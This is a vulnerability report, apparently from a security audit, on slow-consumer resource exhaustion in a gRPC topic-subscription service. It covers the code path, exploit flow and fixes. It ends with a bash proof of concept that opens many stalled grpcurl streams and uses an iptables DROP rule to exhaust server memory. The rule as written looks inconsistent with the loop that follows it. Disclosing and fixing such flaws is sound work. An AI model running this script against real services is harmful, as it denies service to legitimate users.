### Title
Unbounded Netty Write Buffer Growth via Slow gRPC Consumer (Resource Exhaustion / DoS)

### Summary
`grpcServerConfigurer()` configures no Netty write watermarks, and `ConsensusController.subscribeTopic()` drives the Reactor pipeline with an unbounded `.subscribe(responseObserver::onNext, ...)` call that never checks `ServerCallStreamObserver.isReady()`. Because gRPC-Java's `onNext()` is non-blocking (it enqueues into Netty's channel write buffer and returns immediately), the application-level `onBackpressureBuffer` in `SharedTopicListener` never fills from a slow-consumer's perspective, allowing Netty's write buffer to grow without bound until OOM or OS-level connection teardown.

### Finding Description

**Exact code path:**

`GrpcConfiguration.java` lines 28–35 — `grpcServerConfigurer()` configures only `executor` and `maxConcurrentCallsPerConnection`. No `flowControlWindow`, no Netty write high/low watermarks: [1](#0-0) 

`ConsensusController.java` lines 43–53 — the Reactor pipeline is subscribed with a plain lambda, which internally issues `Long.MAX_VALUE` demand and calls `responseObserver::onNext` for every item without ever consulting `ServerCallStreamObserver.isReady()`: [2](#0-1) 

`SharedTopicListener.java` lines 21–26 — the only backpressure guard is `onBackpressureBuffer(maxBufferSize, BufferOverflowStrategy.ERROR)`: [3](#0-2) 

**Root cause and failed assumption:**

The design assumes that `onBackpressureBuffer` will protect against slow consumers. This assumption is wrong. `responseObserver::onNext` in gRPC-Java is **non-blocking**: it serializes the protobuf message and hands it to Netty's channel pipeline, returning immediately regardless of whether the TCP socket is writable. From Reactor's perspective, the downstream always consumes instantly, so the `onBackpressureBuffer` never accumulates items and never fires `ERROR`. The actual backlog accumulates silently inside Netty's `ChannelOutboundBuffer`, which has no configured high-water mark to stop accepting writes.

**Exploit flow:**

1. Attacker opens a TCP connection to port 5600 and issues a valid `subscribeTopic` RPC for any existing topic.
2. Attacker's process calls `recv()` once (to complete the HTTP/2 handshake) and then stops reading.
3. The client's TCP receive buffer fills; the HTTP/2 flow-control window exhausts.
4. The server's Netty transport marks the channel as non-writable, but `onNext` continues to be called (no `isReady()` gate), enqueuing serialized frames into `ChannelOutboundBuffer`.
5. With no write watermark, Netty never signals the application to pause; the buffer grows for every new topic message.
6. Attacker repeats across many connections (each allowed 5 concurrent streams per `maxConcurrentCallsPerConnection`).

### Impact Explanation

Each stalled stream accumulates serialized `ConsensusTopicResponse` frames in Netty's write buffer. A high-throughput topic with large messages (up to the gRPC default 4 MB per message) multiplied across many connections and 5 streams each can exhaust JVM heap, triggering OOM and crashing the gRPC service. This denies service to all legitimate subscribers and, if the gRPC pod is shared infrastructure, can affect dependent services. The `maxConcurrentCallsPerConnection(5)` limit does not bound the number of connections an attacker can open. [4](#0-3) 

### Likelihood Explanation

No authentication is visible in the controller or configuration; any network-reachable client can subscribe. The attack requires only a standard gRPC client (e.g., `grpcurl`) and the ability to suppress reads — achievable with a single `iptables DROP` rule on the attacker's own outbound interface after the handshake, or simply by never calling `recv()`. It is repeatable, scriptable, and requires no special knowledge beyond the public proto API.

### Recommendation

1. **Configure Netty write watermarks** in `grpcServerConfigurer()`:
   ```java
   serverBuilder.channelType(NioServerSocketChannel.class);
   // or via NettyServerBuilder directly:
   serverBuilder.withChildOption(
       ChannelOption.WRITE_BUFFER_WATER_MARK,
       new WriteBufferWaterMark(32 * 1024, 64 * 1024));
   ```
2. **Gate `onNext` on `isReady()`** in `ConsensusController.subscribeTopic()`: cast `responseObserver` to `ServerCallStreamObserver`, register an `onReadyHandler`, and use a `Sinks.Many` or `FluxSink` that only emits when `isReady()` returns `true`.
3. **Add a per-connection or per-IP connection limit** at the load-balancer or via a Netty `ChannelHandler` to bound the number of stalled connections.
4. **Set a server-side stream idle/write timeout** via `NettyServerBuilder.keepAliveTimeout` or a custom `ServerInterceptor` so stalled streams are reaped.

### Proof of Concept

```bash
# 1. Subscribe to a topic and immediately block reads at the OS level
grpcurl -plaintext -d '{"topicID":{"topicNum":1}}' \
  mirror-node:5600 com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
PID=$!

# 2. Drop outbound ACKs so the server's TCP send buffer fills and
#    the HTTP/2 flow-control window exhausts, while the connection stays open
iptables -A OUTPUT -p tcp --dport 5600 -j DROP

# 3. Repeat in a loop across many connections
for i in $(seq 1 200); do
  grpcurl -plaintext -d '{"topicID":{"topicNum":1}}' \
    mirror-node:5600 com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
done

# 4. Monitor server JVM heap — observe unbounded growth in Netty's ChannelOutboundBuffer
# until OOM or GC thrashing renders the service unresponsive to legitimate clients
```

    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
